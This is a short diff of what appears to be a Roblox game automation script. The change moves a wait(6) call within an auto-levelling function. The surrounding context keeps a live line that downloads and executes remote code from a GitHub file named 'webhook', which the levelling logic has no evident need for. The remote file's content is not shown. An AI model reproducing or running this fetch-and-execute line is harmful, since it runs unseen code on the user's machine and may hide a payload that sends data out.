@@ -612,11 +612,11 @@ function autoLv()
 		            end
 			end
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/dorgaes/yea/main/webhook"))()
+			wait(6)
 	            end
 		end
 	    end
 	end
-	wait(6)
 	lvstop()
     end
 end
